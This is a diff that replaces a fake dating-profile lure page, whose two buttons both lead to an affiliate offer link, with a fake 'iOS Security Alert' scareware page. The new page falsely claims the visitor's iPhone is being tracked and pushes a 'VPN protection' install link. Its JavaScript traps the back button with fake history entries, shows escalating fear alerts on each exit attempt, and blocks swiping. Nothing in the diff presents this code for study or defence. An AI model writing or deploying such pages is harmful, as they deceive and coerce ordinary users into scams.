@@ -1,95 +1,183 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Would You Date Me?</title>
-  <style>
-    body {
-      margin: 0;
-      font-family: Arial, sans-serif;
-      background: #f9f9f9;
-      display: flex;
-      justify-content: center;
-    }
-    .profile-card {
-      max-width: 420px;
-      width: 100%;
-      margin: 20px;
-      background: #fff;
-      border-radius: 18px;
-      box-shadow: 0 5px 15px rgba(0,0,0,0.1);
-      overflow: hidden;
-    }
-    .profile-photo {
-      width: 100%;
-      height: 360px;
-      background-image: url('https://i.postimg.cc/cJ2b58fw/RDT-20250803-0259265921380149435635900.webp');
-      background-size: cover;
-      background-position: center;
-    }
-    .info {
-      padding: 22px;
-      text-align: center;
-    }
-    .name {
-      font-size: 22px;
-      font-weight: 700;
-      color: #222;
-    }
-    .location {
-      color: #777;
-      margin-top: 4px;
-      font-size: 14px;
-    }
-    .question {
-      margin: 20px 0;
-      font-size: 20px;
-      color: #444;
-    }
-    .buttons {
-      display: flex;
-      justify-content: center;
-      gap: 16px;
-      margin-top: 15px;
-    }
-    .btn {
-      padding: 12px 28px;
-      font-size: 16px;
-      border: none;
-      border-radius: 10px;
-      cursor: pointer;
-    }
-    .btn-yes {
-      background: #ff3366;
-      color: white;
-    }
-    .btn-no {
-      background: #ddd;
-      color: #333;
-    }
-    .likes {
-      font-size: 14px;
-      color: #888;
-      margin-top: 10px;
-    }
-  </style>
-</head>
-<body>
-
-  <div class="profile-card">
-    <div class="profile-photo"></div>
-    <div class="info">
-      <div class="name">Mimi, 23</div>
-      <div class="location">📍 Miami, FL </div>
-      <div class="question">Would you date me? 😘</div>
-      <div class="buttons">
-        <button class="btn btn-yes" onclick="window.location.href='https://www.gravelroat.info/click?offer_id=32138&pub_id=269631&pub_click_id=ADD_CLICK_ID_HERE&site=PASS_SITE_HERE'">Yes ❤️</button>
-        <button class="btn btn-no" onclick="window.location.href='https://www.gravelroat.info/click?offer_id=32138&pub_id=269631&pub_click_id=ADD_CLICK_ID_HERE&site=PASS_SITE_HERE'">No</button>
-      </div>
-      <div class="likes">💖 24 people recently liked this</div>
-    </div>
-  </div>
-
-</body>
-</html>
+‎<!DOCTYPE html>
+‎<html>
+‎<head>
+‎  <meta charset="UTF-8">
+‎  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+‎  <title>iOS Security Alert</title>
+‎  <style>
+‎    * {
+‎      margin: 0;
+‎      padding: 0;
+‎      box-sizing: border-box;
+‎      -webkit-tap-highlight-color: transparent;
+‎    }
+‎
+‎    body {
+‎      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+‎      background: #f2f2f2;
+‎      color: #111;
+‎      height: 100vh;
+‎      overflow: hidden;
+‎      touch-action: manipulation;
+‎      user-select: none;
+‎      -webkit-user-select: none;
+‎    }
+‎
+‎    .alert-container {
+‎      position: fixed;
+‎      top: 0; left: 0;
+‎      width: 100%; height: 100%;
+‎      display: flex;
+‎      justify-content: center;
+‎      align-items: center;
+‎      padding: 20px;
+‎      background: rgba(0,0,0,0.6);
+‎      z-index: 9999;
+‎    }
+‎
+‎    .alert-box {
+‎      background: #fff;
+‎      /* Red border removed as requested */
+‎      border-radius: 18px;
+‎      padding: 25px;
+‎      max-width: 400px;
+‎      text-align: center;
+‎      box-shadow: 0 8px 20px rgba(0,0,0,0.2);
+‎    }
+‎
+‎    .alert-icon {
+‎      width: 60px;
+‎      height: 60px;
+‎      margin-bottom: 15px;
+‎    }
+‎
+‎    h1 {
+‎      font-size: 18px;
+‎      color: #d10000;
+‎      margin-bottom: 12px;
+‎    }
+‎
+‎    p {
+‎      font-size: 15px;
+‎      line-height: 1.5;
+‎      color: #333;
+‎    }
+‎
+‎    .btn-group {
+‎      margin-top: 20px;
+‎      display: flex;
+‎      flex-direction: column;
+‎      gap: 12px;
+‎    }
+‎
+‎    .btn {
+‎      padding: 14px;
+‎      border-radius: 12px;
+‎      font-size: 16px;
+‎      font-weight: 500;
+‎      border: none;
+‎      cursor: pointer;
+‎    }
+‎
+‎    .btn-install {
+‎      background: #007aff;
+‎      color: #fff;
+‎    }
+‎
+‎    .btn-install:active {
+‎      opacity: 0.9;
+‎    }
+‎
+‎    .btn-cancel {
+‎      background: #e5e5ea;
+‎      color: #111;
+‎    }
+‎
+‎    .btn-cancel:active {
+‎      background: #d1d1d6;
+‎    }
+‎
+‎    .exit-attempts {
+‎      margin-top: 10px;
+‎      font-size: 13px;
+‎      color: #ff3b30;
+‎    }
+‎
+‎    @keyframes shake {
+‎      0%, 100% { transform: translateX(0); }
+‎      25% { transform: translateX(-8px); }
+‎      50% { transform: translateX(8px); }
+‎      75% { transform: translateX(-8px); }
+‎    }
+‎  </style>
+‎</head>
+‎<body>
+‎  <div class="alert-container" id="alertContainer">
+‎    <div class="alert-box" id="alertBox">
+‎      <img src="https://cdn-icons-png.flaticon.com/512/753/753345.png" class="alert-icon" alt="Alert">
+‎      <h1>System Security Alert </h1>
+‎      <p><strong>Your iPhone is being tracked!</strong></p>
+‎      <p>Suspicious behavior has been detected from scammers.</p>
+‎      <p>They may access:<br>• Photos<br>• Passwords<br>• Banking apps</p>
+‎
+‎      <div class="btn-group">
+‎        <button class="btn btn-install" onclick="window.location.href='https://antivirus-browser.netlify.app/'">
+‎          INSTALL VPN PROTECTION NOW
+‎        </button>
+‎        <button class="btn btn-cancel" id="cancelBtn">
+‎          CANCEL (RISKY)
+‎        </button>
+‎      </div>
+‎      <div class="exit-attempts" id="exitAttempts">Exit attempts: 0 / 7</div>
+‎    </div>
+‎  </div>
+‎
+‎  <script>
+‎    let attempts = 0;
+‎    const maxAttempts = 7;
+‎    const cancelBtn = document.getElementById('cancelBtn');
+‎    const exitAttemptsText = document.getElementById('exitAttempts');
+‎    const alertBox = document.getElementById('alertBox');
+‎
+‎    // Push 10 fake states to aggressively trap back
+‎    for (let i = 0; i < 10; i++) {
+‎      history.pushState({}, '', location.href);
+‎    }
+‎
+‎    // Trap back button
+‎    window.onpopstate = function () {
+‎      history.pushState({}, '', location.href);
+‎      handleExitAttempt();
+‎    };
+‎
+‎    function handleExitAttempt() {
+‎      attempts++;
+‎      if (attempts <= maxAttempts) {
+‎        const messages = [
+‎          "iOS Security Risk Detected!",
+‎          "Location Tracking Active!",
+‎          "Bank Info Compromised!",
+‎          "Immediate VPN Protection Needed!",
+‎          "Critical: iCloud Access Risk!",
+‎          "Final Warning: Stop Exit!",
+‎          "You're at maximum risk!"
+‎        ];
+‎        alert(`⚠️ ${messages[attempts - 1]}`);
+‎        exitAttemptsText.textContent = `Exit attempts: ${attempts} / ${maxAttempts}`;
+‎        alertBox.style.animation = "shake 0.4s";
+‎        setTimeout(() => alertBox.style.animation = "", 500);
+‎      } else {
+‎        window.location.href = "about:blank"; // Final exit allowed
+‎      }
+‎    }
+‎
+‎    cancelBtn.addEventListener('click', handleExitAttempt);
+‎
+‎    // Prevent scroll or swipe exit
+‎    document.addEventListener('touchmove', function (e) {
+‎      e.preventDefault();
+‎    }, { passive: false });
+‎  </script>
+‎</body>
+‎</html>
+‎
